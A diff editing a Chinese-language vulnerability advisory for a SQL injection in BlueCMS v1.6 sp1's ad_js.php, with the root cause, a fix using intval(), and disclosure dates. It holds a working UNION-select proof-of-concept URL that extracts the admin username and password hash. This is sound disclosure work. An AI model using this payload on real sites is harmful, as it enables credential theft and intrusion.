@@ -28,8 +28,8 @@ BlueCMS v1.6 sp1 ad_js.php SQL注入漏
 | 厂商评rank | 10 |
 | 漏洞简介 | BlueCMS v1.6 sp1 某页面SQL注入漏洞 |
 | 漏洞细节 | 缺陷文件：ad_js.php
-| 漏洞成因 | 12: `$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';` 根目录下其他他文件都做了很好的过滤，对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格  19: `$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); ` //直接代入查询。。汗。 | 
-|POC | `http://localhost/cms/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,concat(admin_name,0x7C0D0A,pwd),concat(admin_name,0x7C0D0A,pwd)%20from%20blue_admin%20where%20admin_id=1`  右键查看源代码得到返回数据。|
+| 漏洞成因 | 第12行: `$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';` 根目录下其他他文件都做了很好的过滤，对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格。 第19行: `$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); ` //直接代入查询。。汗。 | 
+|POC | `view-source:http://localhost/cms/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,concat(admin_name,0x7C0D0A,pwd),concat(admin_name,0x7C0D0A,pwd)%20from%20blue_admin%20where%20admin_id=1`|
 | 修复方案 | `$ad_id = !empty($_GET['ad_id']) ? intval($_GET['ad_id']) : '';`  |
 | 状态信息 | 2010-07-30： 积极联系厂商并且等待厂商认领中，细节不对外公开 2010-07-30: 厂商已经主动忽略漏洞，细节向公众公开 |
 | 厂商回复 | (not set) |
